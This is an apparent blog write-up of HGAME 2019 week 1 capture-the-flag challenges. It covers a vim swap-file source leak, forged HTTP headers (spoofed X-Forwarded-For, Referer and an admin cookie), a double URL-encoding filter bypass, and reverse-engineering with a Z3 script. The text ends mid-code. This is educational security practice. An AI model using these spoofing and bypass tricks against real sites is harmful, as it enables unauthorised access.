<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="keywords" content="Hexo Theme Redefine"><meta name="author" content="Catalpa"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="canonical" href="https://wzt.ac.cn/2019/02/02/hgame-2019/"><meta name="robots" content="index,follow"><meta name="googlebot" content="index,follow"><meta name="revisit-after" content="1 days"><meta name="description" content="感谢杭电的师傅们举办的精彩比赛！"><meta property="og:type" content="article"><meta property="og:title" content="HGAME 2019 week1"><meta property="og:url" content="https://wzt.ac.cn/2019/02/02/hgame-2019/index.html"><meta property="og:site_name" content="Catalpa&#39;s Site"><meta property="og:description" content="感谢杭电的师傅们举办的精彩比赛！"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://wzt.ac.cn/image/hgame2019-1.png"><meta property="og:image" content="https://wzt.ac.cn/image/hgame2019-2.png"><meta property="og:image" content="https://wzt.ac.cn/image/hgame2019-3.png"><meta property="og:image" content="https://wzt.ac.cn/image/hgame2019-4.png"><meta property="og:image" content="https://wzt.ac.cn/image/hgame2019-5.png"><meta property="og:image" content="https://wzt.ac.cn/image/hgame2019-6.png"><meta property="article:published_time" content="2019-02-01T16:00:00.000Z"><meta property="article:modified_time" content="2024-10-17T00:49:46.953Z"><meta property="article:author" content="Catalpa"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://wzt.ac.cn/image/hgame2019-1.png"><link rel="icon" type="image/png" href="/img/favicon.ico" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/img/favicon.ico"><meta name="theme-color" content="#A31F34"><link rel="shortcut icon" href="/img/favicon.ico"><title>HGAME 2019 week1 - Catalpa&#39;s Site</title><link rel="stylesheet" href="/fonts/Chillax/chillax.css"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/assets/build/styles.css"><link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css"><link rel="stylesheet" href="/fonts/Geist/geist.css"><script src="/js/libs/anime.min.js"></script><script id="hexo-configurations">window.config={hostname:"wzt.ac.cn",root:"/",language:"en",path:"search.xml"},window.theme={articles:{style:{font_size:"16px",line_height:1.5,image_border_radius:"14px",image_alignment:"center",image_caption:!1,link_icon:!0,title_alignment:"left",headings_top_spacing:{h1:"3.2rem",h2:"2.4rem",h3:"1.9rem",h4:"1.6rem",h5:"1.4rem",h6:"1.3rem"}},word_count:{enable:!0,count:!0,min2read:!0},author_label:{enable:!0,auto:!1,list:["网络安全爱好者"]},code_block:{copy:!0,style:"mac",highlight_theme:{light:"github",dark:"vs2015"},font:{enable:!1,family:null,url:null}},toc:{enable:!0,max_depth:3,number:!1,expand:!0,init_open:!0},copyright:{enable:!0,default:"cc_by_nc_sa"},lazyload:!0,recommendation:{enable:!1,title:"推荐阅读",limit:3,mobile_limit:2,placeholder:"/images/wallhaven-wqery6-light.webp",skip_dirs:[]}},colors:{primary:"#A31F34",secondary:null,default_mode:"light"},global:{fonts:{chinese:{enable:!1,family:null,url:null},english:{enable:!1,family:null,url:null},title:{enable:!1,family:null,url:null}},content_max_width:"1000px",sidebar_width:"210px",hover:{shadow:!0,scale:!1},scroll_progress:{bar:!1,percentage:!0},website_counter:{url:"https://cn.vercount.one/js",enable:!0,site_pv:!0,site_uv:!0,post_pv:!0},single_page:!0,preloader:{enable:!0,custom_message:null},open_graph:!0,google_analytics:{enable:!1,id:null}},home_banner:{enable:!0,style:"fixed",image:{light:"/images/wallhaven-wqery6-light.webp",dark:"/images/wallhaven-wqery6-dark.webp"},title:"Welcome!",subtitle:{text:["欢迎来到本站!","今天有什么新鲜事吗?","知识不应该是付费的!","持续学习 持续进步","网络安全爱好者","非常感谢您的捐赠!","祝您拥有美好的一天!"],hitokoto:{enable:!1,show_author:!1,api:"https://v1.hitokoto.cn"},typing_speed:100,backing_speed:80,starting_delay:500,backing_delay:1500,loop:!0,smart_backspace:!0},text_color:{light:"#fff",dark:"#d1d1b6"},text_style:{title_size:"2.8rem",subtitle_size:"1.5rem",line_height:1.2},custom_font:{enable:!1,family:null,url:null},social_links:{enable:!0,style:"default",links:{github:"https://github.com/rrrrrrri",instagram:null,zhihu:null,twitter:null,email:"anu11@foxmail.com"},qrs:{weixin:null,"fa-solid fa-hand-holding-dollar":"/img/w.png"}}},plugins:{feed:{enable:!1},aplayer:{enable:!1,type:"fixed",audios:[{name:null,artist:null,url:null,cover:null,lrc:null}]},mermaid:{enable:!1,version:"9.3.0"}},version:"2.7.1",navbar:{auto_hide:!1,color:{left:"#f78736",right:"#367df7",transparency:35},width:{home:"1200px",pages:"1000px"},links:{Home:{path:"/",icon:"fa-regular fa-house"},"归档":{path:"/archives",icon:"fa-regular fa-archive"},"感谢捐赠":{path:"/donates",icon:"fa-solid fa-hand-holding-dollar"}},search:{enable:!0,preload:!0}},page_templates:{friends_column:2,tags_style:"blur"},home:{sidebar:{enable:!0,position:"left",first_item:"menu",announcement:"读者有责任遵守其所在国家或地区的所有法律，作者不对使用其文章中提到的任何内容所造成的任何损害负责。",show_on_mobile:!0,links:null},article_date_format:"auto",excerpt_length:200,categories:{enable:!1,limit:3},tags:{enable:!1,limit:3}},footerStart:"2018/9/1 08:00:00"},window.lang_ago={second:"%s seconds ago",minute:"%s minutes ago",hour:"%s hours ago",day:"%s days ago",week:"%s weeks ago",month:"%s months ago",year:"%s years ago"},window.data={masonry:!1}</script><link rel="stylesheet" href="/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/fontawesome/brands.min.css"><link rel="stylesheet" href="/fontawesome/solid.min.css"><link rel="stylesheet" href="/fontawesome/regular.min.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="progress-bar-container"><span class="pjax-progress-bar"></span></div><style>:root{--preloader-background-color:#fff;--preloader-text-color:#000}@media (prefers-color-scheme:dark){:root{--preloader-background-color:#202124;--preloader-text-color:#fff}}@media (prefers-color-scheme:light){:root{--preloader-background-color:#fff;--preloader-text-color:#000}}@media (max-width:600px){.ml13{font-size:2.6rem!important}}.preloader{display:flex;flex-direction:column;gap:1rem;align-items:center;justify-content:center;position:fixed;padding:12px;top:0;right:0;bottom:0;left:0;width:100vw;height:100vh;background-color:var(--preloader-background-color);z-index:1100;transition:opacity .2s ease-in-out}.ml13{font-size:3.2rem;color:var(--preloader-text-color);letter-spacing:-1px;font-weight:500;font-family:Chillax-Variable,sans-serif;text-align:center}.ml13 .word{display:inline-flex;flex-wrap:wrap;white-space:nowrap}.ml13 .letter{display:inline-block;line-height:1em}</style><div class="preloader"><h2 class="ml13">Catalpa&#39;s Site</h2><script>var textWrapper = document.querySelector('.ml13');
        // Split text into words
        var words = textWrapper.textContent.trim().split(' ');

        // Clear the existing content
        textWrapper.innerHTML = '';

        // Wrap each word and its letters in spans
        words.forEach(function(word) {
            var wordSpan = document.createElement('span');
            wordSpan.classList.add('word');
            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
            textWrapper.appendChild(wordSpan);
            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
        });

        var animation = anime.timeline({loop: true})
            .add({
                targets: '.ml13 .letter',
                translateY: [40,0],
                translateZ: 0,
                opacity: [0,1],
                filter: ['blur(5px)', 'blur(0px)'], // Starting from blurred to unblurred
                easing: "easeOutExpo",
                duration: 1400,
                delay: (el, i) => 300 + 30 * i,
            }).add({
                targets: '.ml13 .letter',
                translateY: [0,-40],
                opacity: [1,0],
                filter: ['blur(0px)', 'blur(5px)'], // Ending from unblurred to blurred
                easing: "easeInExpo",
                duration: 1200,
                delay: (el, i) => 100 + 30 * i,
                complete: function() {
                    hidePreloader(); // Call hidePreloader after the animation completes
                }
            });

        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;

        // If the theme status is not found in local storage, check the preferred color scheme
        if (themeStatus === undefined || themeStatus === null) {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                themeStatus = 'dark';
            } else {
                themeStatus = 'light';
            }
        }

        // Now you can use the themeStatus variable in your code
        if (themeStatus) {
            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
        } else {
            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
            document.documentElement.style.setProperty('--preloader-text-color', '#000');
        }

        window.addEventListener('load', function () {
            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
        });

        function hidePreloader() {
            var preloader = document.querySelector('.preloader');
            preloader.style.opacity = '0';
            setTimeout(function () {
                preloader.style.display = 'none';
            }, 200);
        }</script></div><main class="page-container" id="swup"><div class="main-content-container"><div class="main-content-header"><header class="navbar-container px-6 md:px-12"><div class="navbar-content"><div class="left"><a class="logo-image" href="/"><img src="/img/favicon.ico"> </a><a class="logo-title" href="/">Catalpa&#39;s Site</a></div><div class="right"><div class="desktop"><ul class="navbar-list"><li class="navbar-item"><a href="/"><i class="fa-regular fa-house fa-fw"></i> HOME</a></li><li class="navbar-item"><a href="/archives"><i class="fa-regular fa-archive fa-fw"></i> 归档</a></li><li class="navbar-item"><a href="/donates"><i class="fa-solid fa-hand-holding-dollar fa-fw"></i> 感谢捐赠</a></li><li class="navbar-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div><div class="icon-item navbar-bar"><div class="navbar-bar-middle"></div></div></div></div></div><div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between"><ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start"><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/"><span>HOME </span><i class="fa-regular fa-house fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/archives"><span>归档 </span><i class="fa-regular fa-archive fa-sm fa-fw"></i></a></li><li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full"><a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full" href="/donates"><span>感谢捐赠 </span><i class="fa-solid fa-hand-holding-dollar fa-sm fa-fw"></i></a></li></ul><div class="statistics flex justify-around my-2.5"><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div><div class="label text-third-text-color text-sm">Tags</div></a><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">4</div><div class="label text-third-text-color text-sm">Categories</div></a><a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives"><div class="number text-2xl sm:text-xl text-second-text-color font-semibold">67</div><div class="label text-third-text-color text-sm">Posts</div></a></div></div><div class="window-mask"></div></header></div><div class="main-content-body"><div class="main-content"><div class="post-page-container flex relative justify-between box-border w-full h-full"><div class="article-content-container"><div class="article-title relative w-full"><div class="w-full flex items-center pt-6 justify-start"><h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">HGAME 2019 week1</h1></div></div><div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8"><div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]"><img src="/img/logo.png"></div><div class="info flex flex-col justify-between"><div class="author flex items-center"><span class="name text-default-text-color text-lg font-semibold">Catalpa</span> <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">网络安全爱好者</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-pen-fancy"></i>&nbsp; <span class="desktop">2019-02-02</span> <span class="mobile">2019-02-02</span> <span class="hover-info">Created</span> </span><span class="article-date article-meta-item"><i class="fa-regular fa-wrench"></i>&nbsp; <span class="desktop">2024-10-17 08:49:46</span> <span class="mobile">2024-10-17 08:49:46</span> <span class="hover-info">Updated</span> </span><span class="article-categories article-meta-item"><i class="fa-regular fa-folders"></i>&nbsp;<ul><li><a href="/categories/CTF/">CTF</a>&nbsp;</li></ul></span><span class="article-wordcount article-meta-item"><i class="fa-regular fa-typewriter"></i>&nbsp;<span>4.5k Words</span> </span><span class="article-min2read article-meta-item"><i class="fa-regular fa-clock"></i>&nbsp;<span>23 Mins</span> </span><span class="article-pv article-meta-item"><i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8"><p>感谢杭电的师傅们举办的精彩比赛！</p><span id="more"></span><h2 id="谁吃了我的-flag"><a href="#谁吃了我的-flag" class="headerlink" title="谁吃了我的 flag"></a>谁吃了我的 flag</h2><p>根据题目提示想到应该是 vim 代码泄露，直接访问</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.25.111.31:10086/.index.html.swp</span><br></pre></td></tr></table></figure></div><p>下载到题目的源代码，在 linux 下使用命令 vim -r index.html.swp 即可还原出 flag。</p><p>flag: hgame{3eek_diScl0Sure_fRom+wEbsit@}</p><h2 id="换头大作战"><a href="#换头大作战" class="headerlink" title="换头大作战"></a>换头大作战</h2><p>考察了 header 的一些知识点，打开网页在输入框中随便写一点东西然后点击提交<br><img lazyload src="/images/loading.svg" data-src="/image/hgame2019-1.png" alt="image"><br>提示需要使用 post 方式提交，使用 hackbar 提交，之后又会提示需要添加 XFF 头，构造下面的请求包：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /week1/how/index.php?want=yes HTTP/1.1</span><br><span class="line">Host: 120.78.184.111:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://120.78.184.111:8080/week1/how/index.php?want=yes</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Content-Length: 8</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: admin=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">want=yes</span><br></pre></td></tr></table></figure></div><p>接着又提示要使用 waterfox 浏览器访问，将 User-Agent 最后的 Firefox&#x2F;64.0 改成 Waterfox&#x2F;50.0 即可<br>接着要求从 哔哩哔哩来到这个网站，修改 Referer 为 <a class="link" target="_blank" rel="noopener" href="http://www.bilibili.com/">www.bilibili.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 即可。<br>最后一步要求我们是 admin，将cookie 改成 admin&#x3D;1。</p><p>flag: hgame{hTTp_HeaDeR_iS_Ez}</p><h2 id="very-easy-web"><a href="#very-easy-web" class="headerlink" title="very easy web"></a>very easy web</h2><p>题目给出如下代码</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;flag.php&quot;);</span><br><span class="line"></span><br><span class="line">if(strpos(&quot;vidar&quot;,$_GET[&#x27;id&#x27;])!==FALSE)</span><br><span class="line">  die(&quot;&lt;p&gt;干巴爹&lt;/p&gt;&quot;);</span><br><span class="line"></span><br><span class="line">$_GET[&#x27;id&#x27;] = urldecode($_GET[&#x27;id&#x27;]);</span><br><span class="line">if($_GET[&#x27;id&#x27;] === &quot;vidar&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo $flag;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div><p>意思是要提交一个 get 类型的参数 id，并且不能包含字符串 vidar，但是在 urldecode 之后是 vidar。<br>非常简单，我们将 vidar url编码两次，原因是服务器接受到参数之后会自动解码一次，然后代码中再解码一次。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.78.184.111:8080/week1/very_ez/index.php?id=%2576%2569%2564%2561%2572</span><br></pre></td></tr></table></figure></div><p>flag: hgame{urlDecode_Is_GoOd}</p><h2 id="can-u-find-me"><a href="#can-u-find-me" class="headerlink" title="can u find me?"></a>can u find me?</h2><p>F12 找到另一个页面 f12.php，之后需要我们 post 一个密码，密码就在返回包的头部</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password: woyaoflag</span><br></pre></td></tr></table></figure></div><p>然后给出了一个链接，点进去说太快了，那么抓包再发送。</p><p>flag: hgame{f12_1s_aMazIng111}</p><h2 id="brainfxxker"><a href="#brainfxxker" class="headerlink" title="brainfxxker"></a>brainfxxker</h2><p>题目直接给了源代码，其实就是实现了一个 brainfuck 解释器，有关于 brainfuck 的语法在网上有很多。<br>分析给出的那段 brainfuck 代码就可以了，由于 “,” 是输入，所以把整个程序分成 9 段，每一段代表 flag 中的一个字符，通过上面的提示，使程序不输出任何内容的输入为正确的 flag，以第一段代码为例</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">,&gt;++++++++++[&lt;----------&gt;-]&lt;++[+.]</span><br><span class="line"></span><br><span class="line">,     输入</span><br><span class="line">&gt;     指针后移</span><br><span class="line">++++++++++  循环变量设置为 10</span><br><span class="line">loop:</span><br><span class="line">    [       开始循环</span><br><span class="line">    &lt;       指针左移一位(指向输入的字符)</span><br><span class="line">    ----------  输入的字符自减 10</span><br><span class="line">    &gt;       指针右移一位(指向循环变量)</span><br><span class="line">    -       循环变量自减 1</span><br><span class="line">    ]       判断是否结束</span><br><span class="line">&lt;     指针左移，指向输入的字符</span><br><span class="line">++    自增 2</span><br><span class="line">loop:  (要求这个循环不能执行)</span><br><span class="line">    [       开始循环</span><br><span class="line">    +       自增 1</span><br><span class="line">    .       输出字符       </span><br><span class="line">    ]       结束循环       </span><br><span class="line">逻辑： 输入一个字符，减去 100 再加 2, 最后要求等于零</span><br><span class="line">x - 100 + 2 == 0 --&gt; 98 --&gt; b</span><br></pre></td></tr></table></figure></div><p>每一段代码相当于实现了一个上面的方程，将 9 段代码全部分析出来之后即可得到 flag。</p><p>flag: hgame{bR4!NfUcK}</p><h2 id="HelloRe"><a href="#HelloRe" class="headerlink" title="HelloRe"></a>HelloRe</h2><p>IDA 打开找到 flag。</p><p>flag: hgame{Welc0m3_t0_R3_World!}</p><h2 id="わかります"><a href="#わかります" class="headerlink" title="わかります"></a>わかります</h2><p>这道题稍微有点费劲，关键代码如下<br><img lazyload src="/images/loading.svg" data-src="/image/hgame2019-2.png" alt="image"></p><p>关键函数是中间的 sub_40078E 和 sub_400892。<br>本程序的基本逻辑是先将输入的 flag 进行两次不同的编码</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for ( i = 0; i &lt; len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    chunk1[i] = (flag[i] &gt;&gt; 4);</span><br><span class="line">    chunk2[i] = flag[i] &amp; 0xF;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div><p>分别保存在两个局部变量中，接着进入关键函数，第一个函数实现的是两个矩阵相乘，结果保存在 v8 中，第二个函数实现的是矩阵相加，由于两个矩阵都是 6 阶方阵，所以运算也相对简单，根据下面的方程</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">enc_flag * token = dword_602120</span><br><span class="line"></span><br><span class="line">enc_flag + token = dword_6021c0</span><br></pre></td></tr></table></figure></div><p>现在 token 和最终的运算结果都已知，那么 flag 矩阵是可以求出的，求矩阵的方法有很多，我采取 Z3 进行约束求解</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">target1 = [122, 207, 140, 149, 142, 168, </span><br><span class="line">           95,  201, 122, 145, 136, 167, </span><br><span class="line">           112, 192, 127, 137, 134, 147, </span><br><span class="line">           95, 207, 110, 134, 133, 173, </span><br><span class="line">           136, 212, 160, 162, 152, 179, </span><br><span class="line">           121, 193, 126, 126, 119, 147]</span><br><span class="line"></span><br><span class="line">token = [8, 1, 7, 1, 1, 0, </span><br><span class="line">         4, 8, 1, 2, 3, 9, </span><br><span class="line">         3, 8, 6, 6, 4, 8, </span><br><span class="line">         3, 5, 7, 8, 8, 7, </span><br><span class="line">         0, 9, 0, 2, 3, 4, </span><br><span class="line">         2, 3, 2, 5, 4, 0]</span><br><span class="line"></span><br><span class="line">target2 = [16, 8, 8, 14, 6, 11, </span><br><span class="line">           5, 23, 5, 10, 12, 23, </span><br><span class="line">		   14, 23, 19, 7, 8, 10, </span><br><span class="line">		   4, 13, 22, 17, 11, 22, </span><br><span class="line">		   6, 14, 2, 11, 18, 9, </span><br><span class="line">		   5, 8, 8, 10, 16, 13]</span><br><span class="line"></span><br><span class="line">chunk2 = [8, 7, 1, 13, 5, 11, 1, 15, 4, 8, 9, 14, 11, 15, 13, 1, 4, 2, 1, 8, 15, 9, 3, 15, 6, 5, 2, 9, 15, 5, 3, 5, 6, 5, 12, 13]</span><br><span class="line"></span><br><span class="line">a = BitVec(&#x27;a&#x27;, 8)</span><br><span class="line">b = BitVec(&#x27;b&#x27;, 8)</span><br><span class="line">c = BitVec(&#x27;c&#x27;, 8)</span><br><span class="line">d = BitVec(&#x27;d&#x27;, 8)</span><br><span class="line">e = BitVec(&#x27;e&#x27;, 8)</span><br><span class="line">f = BitVec(&#x27;f&#x27;, 8)</span><br><span class="line"></span><br><span class="line">j = 0</span><br><span class="line">k = 0</span><br><span class="line">p = 0</span><br><span class="line">for q in range(6):</span><br><span class="line">    solve((a &gt;&gt; 4) * token[k] + (b &gt;&gt; 4) * token[k + 6] + (c &gt;&gt; 4) * token[k + 12] + (d &gt;&gt; 4) * token[k + 18] + (e &gt;&gt; 4) * token[k + 24] + (f &gt;&gt; 4) * token[k + 30] == target1[j],</span><br><span class="line">(a &gt;&gt; 4) * token[k + 1] + (b &gt;&gt; 4) * token[k + 6 + 1] + (c &gt;&gt; 4) * token[k + 12 + 1] + (d &gt;&gt; 4) * token[k + 18 + 1] + (e &gt;&gt; 4) * token[k + 24 + 1] + (f &gt;&gt; 4) * token[k + 30 + 1] == target1[j + 1],</span><br><span class="line">(a &gt;&gt; 4) * token[k + 2] + (b &gt;&gt; 4) * token[k + 6 + 2] + (c &gt;&gt; 4) * token[k + 12 + 2] + (d &gt;&gt; 4) * token[k + 18 + 2] + (e &gt;&gt; 4) * token[k + 24 + 2] + (f &gt;&gt; 4) * token[k + 30 + 2] == target1[j + 2],</span><br><span class="line">(a &gt;&gt; 4) * token[k + 3] + (b &gt;&gt; 4) * token[k + 6 + 3] + (c &gt;&gt; 4) * token[k + 12 + 3] + (d &gt;&gt; 4) * token[k + 18 + 3] + (e &gt;&gt; 4) * token[k + 24 + 3] + (f &gt;&gt; 4) * token[k + 30 + 3] == target1[j + 3],</span><br><span class="line">(a &gt;&gt; 4) * token[k + 4] + (b &gt;&gt; 4) * token[k + 6 + 4] + (c &gt;&gt; 4) * token[k + 12 + 4] + (d &gt;&gt; 4) * token[k + 18 + 4] + (e &gt;&gt; 4) * token[k + 24 + 4] + (f &gt;&gt; 4) * token[k + 30 + 4] == target1[j + 4],</span><br><span class="line">(a &gt;&gt; 4) * token[k + 5] + (b &gt;&gt; 4) * token[k + 6 + 5] + (c &gt;&gt; 4) * token[k + 12 + 5] + (d &gt;&gt; 4) * token[k + 18 + 5] + (e &gt;&gt; 4) * token[k + 24 + 5] + (f &gt;&gt; 4) * token[k + 30 + 5] == target1[j + 5],</span><br><span class="line">a &amp; 0xf == chunk2[p], b &amp; 0xf == chunk2[p + 1], c &amp; 0xf == chunk2[p + 2], d &amp; 0xf == chunk2[p + 3], e &amp; 0xf == chunk2[p + 4], f &amp; 0xf == chunk2[p + 5])</span><br><span class="line">    j += 6</span><br><span class="line">    p += 6</span><br><span class="line"></span><br><span class="line">#[f = 123, b = 103, a = 104, c = 97, d = 109, e = 101]</span><br><span class="line">#[f = 110, b = 95, a = 49, c = 116, d = 104, e = 105]</span><br><span class="line">#[f = 114, b = 95, a = 107, c = 77, d = 97, e = 116]</span><br><span class="line">#[f = 95, b = 120, a = 49, c = 95, d = 105, e = 115]</span><br><span class="line">#[f = 117, b = 101, a = 118, c = 114, d = 121, e = 95]</span><br><span class="line">#[f = 125, b = 101, a = 115, c = 102, d = 53, e = 108]</span><br><span class="line"></span><br><span class="line">#hgame&#123;1_think_Matr1x_is_very_usef5l&#125;</span><br><span class="line"></span><br><span class="line">flag = [104,103,97,109,101,123,49,95,116,104,105,110,107,95,77,97,116,114,49,120,95,105,115,95,118,101,114,121,95,117,115,101,102,53,108,125]</span><br><span class="line"></span><br><span class="line">qwer = &quot;&quot;</span><br><span class="line">for q in flag:</span><br><span class="line">    qwer += chr(q)</span><br><span class="line">print(qwer)</span><br></pre></td></tr></table></figure></div><p>flag: hgame{1_think_Matr1x_is_very_usef5l}</p><h2 id="r-amp-xor"><a href="#r-amp-xor" class="headerlink" title="r &amp; xor"></a>r &amp; xor</h2><p>简单的异或加密，需要注意一点，由于 IDA 的解析问题，有一部分 token 不能显示出来，需要动态调试得到。</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">s = &quot;hgame&#123;Y0u_mayb3_need_th1s_0ne!!!!!&#125;&quot;</span><br><span class="line">d = [0,0,0,0,0,0,1,0,7,0,92,18,38,11,93,43,11,23,0,23,43,69,6,86,44,54,67,0,66,85,126,72,85,30,0,0]</span><br><span class="line">t = 